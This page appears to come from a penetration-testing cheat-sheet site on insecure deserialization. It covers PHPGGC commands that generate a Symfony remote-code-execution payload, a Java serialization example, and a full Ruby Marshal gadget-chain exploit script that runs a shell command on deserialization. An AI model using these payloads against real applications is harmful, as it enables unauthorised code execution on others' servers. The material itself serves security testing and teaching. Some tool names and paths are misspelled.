---
title: Insecure Deserialization
description: Insecure deserialization is when user-controllable data is deserialized by a website. This potentially enables an attacker to manipulate serialized objects in order to pass harmful data into the application code.
badge: Web
---


## PHP

### PHP's Serialized objects format

### PHPGGC

PGP Generic Gadget Chains (PHPGGC)

#### Installation

<smart-tabs variable="tool-docker-vs-cli" :tabs="{'docker': 'Docker', 'cli': 'Command Line'}">
<template v-slot:docker>

Simply clone the repo, build the image and tag it like you want:
```bash
git clone "https://github.com/ambionics/phpggc.git" {{ tmp-dir /tmp/phpgcc }}
docker build -t {{ image-tag phpggc }} {{ tmp-dir /tmp/phpgcc }}
```


</template>
<template v-slot:cli>

> PHP >= 5.6 is required to run PHPGGC.
```bash
git clone https://github.com/ambionics/phpggc.git phpgcc
```
The executable will be at `${PWD}/phpgcc/phpgcc`. It is advisable to add it to your path

</template>
</smart-tabs>




#### Usage
You can list the available gadgets with phpggc -l:

<smart-tabs variable="tool-docker-vs-cli" :tabs="{'docker': 'Docker', 'cli': 'Command Line'}">
<template v-slot:docker>

```bash
docker run --rm {{ image-tag phpggc }} -l
```

</template>
<template v-slot:cli>

```bash
phpggc  -l
```

</template>
</smart-tabs>


Usually this gadget chains ask you to specify a function to be called and arguments. Typically you will be going for RCEs, so here is an example using the `system` function:

<smart-tabs variable="tool-docker-vs-cli" :tabs="{'docker': 'Docker', 'cli': 'Command Line'}">
<template v-slot:docker>

```bash
docker run --rm {{ image-tag phpggc }} -b "Symfony/RCE4" "system" "{{ payload id }}" | clip.exe
```

</template>
<template v-slot:cli>

```bash
phpggc -b "Symfony/RCE4" "system" "{{ payload id }}" | clip.exe
```

</template>
</smart-tabs>



## Java

### ysoserial

### Using custom gadget chains

If you got access to some source code, you might want to develop your own gadget chain. The following snippet can be used as an example of how to serialize and deserialize objects in Java:

```java[Main.java]
import data.Foo;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.util.Base64;

class Main {
    public static void main(String[] args) throws Exception {
        Foo originalObject = new Foo("str", 123);

        String serializedObject = serialize(originalObject);
        System.out.println("Serialized object: " + serializedObject);

        Foo deserializedObject = deserialize(serializedObject);
        System.out.println("Deserialized data str: " + deserializedObject.str + ", num: " + deserializedObject.num);
    }

    private static String serialize(Serializable obj) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream(512);
        try (ObjectOutputStream out = new ObjectOutputStream(baos)) {
            out.writeObject(obj);
        }
        return Base64.getEncoder().encodeToString(baos.toByteArray());
    }

    private static <T> T deserialize(String base64SerializedObj) throws Exception {
        try (ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(Base64.getDecoder().decode(base64SerializedObj)))) {
            @SuppressWarnings("unchecked")
            T obj = (T) in.readObject();
            return obj;
        }
    }
}
```


## Ruby

### Ruby 2.X deserialization RCE

Therre is a known gadget chain that achieves RCE on Ruby applications. The requsites are as follows:
1. The ActiveSupport gem **must** be installed and loaded.
2. ERB from the standard library **must** be loaded (_which Ruby does not load by default_).
3. After deserialization, a method that does not exist must be called on the deserialized object.

> While these pre-requisites will almost certainly be fulfilled in the context of any Ruby on Rails web application, they are rarely fulfilled by other Ruby applications.

```ruby[deserialzationRORexploit.rb]
#!/usr/bin/env ruby

class Gem::StubSpecification
	def initialize; end
end

stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|{{ payload whoami }} 1>&2")

puts "STEP n"
stub_specification.name rescue nil
puts

class Gem::Source::SpecificFile
	def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file <=> other_specific_file rescue nil
puts

$dependency_list = Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts

class Gem::Requirement
	def marshal_dump
		[$dependency_list]
	end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts

puts "VALIDATION (in fresh ruby process):"
IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
	pipe.print payload
	pipe.close_write
	puts pipe.gets
	puts
end

puts "Payload (hex):"
puts payload.unpack('H*')[0]
puts
require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)
```